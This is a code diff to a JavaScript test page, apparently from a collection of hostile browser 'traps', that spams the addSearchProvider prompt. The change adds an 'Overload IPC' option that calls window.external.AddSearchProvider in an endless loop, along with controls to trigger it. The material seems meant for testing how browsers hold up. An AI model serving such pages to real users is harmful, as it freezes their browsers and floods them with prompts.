@@ -17,7 +17,13 @@ module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY
     });
   })
   .addScriptPage(() => {
-    function spamAddSearchProvider(uri, intervalMS = 500) {
+    function spamAddSearchProvider(uri, { overloadIPC = false, intervalMS = 500 } = {}) {
+      if (overloadIPC) {
+        while (true) {
+          window.external.AddSearchProvider(uri);
+        }
+      }
+
       // Since the scope of this prompt DoS rather than IPC DoS, only trigger prompts every few ms.
       setInterval(() => {
         window.external.AddSearchProvider(uri);
@@ -28,20 +34,37 @@ module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY
     intervalInputLabel.innerText = 'Call interval (ms)';
 
     const intervalInput = document.createElement('input');
-    intervalInput.type = 'text';
+    intervalInput.type = 'number';
     intervalInput.value = 500;
 
     document.body.appendChild(intervalInputLabel);
     document.body.appendChild(intervalInput);
 
+    const ipcCheck = document.createElement('input');
+    ipcCheck.type = 'checkbox';
+
+    const ipcCheckLabel = document.createElement('label');
+    ipcCheckLabel.innerText = 'Overload IPC';
+
+    ipcCheck.addEventListener('change', () => {
+      intervalInput.disabled = ipcCheck.checked;
+    });
+
+    document.body.appendChild(ipcCheckLabel);
+    document.body.appendChild(ipcCheck);
+
     const btnInvalidEngine = document.createElement('button');
     btnInvalidEngine.innerText = 'Invalid Search Engine';
-    btnInvalidEngine.addEventListener('click', () => spamAddSearchProvider(' ', Number.parseInt(intervalInput.value, 10)), { once: true });
+    btnInvalidEngine.addEventListener('click', () => spamAddSearchProvider(' ', {
+      intervalMS: Number.parseInt(intervalInput.value, 10), overloadIPC: ipcCheck.checked,
+    }), { once: true });
 
     const btnValidEngine = document.createElement('button');
     btnValidEngine.innerText = 'Valid Search Engine';
 
-    btnValidEngine.addEventListener('click', () => spamAddSearchProvider('opensearch.xml', Number.parseInt(intervalInput.value, 10)), { once: true });
+    btnValidEngine.addEventListener('click', () => spamAddSearchProvider('opensearch.xml', {
+      intervalMS: Number.parseInt(intervalInput.value, 10), overloadIPC: ipcCheck.checked,
+    }), { once: true });
 
     document.body.appendChild(btnInvalidEngine);
     document.body.appendChild(btnValidEngine);
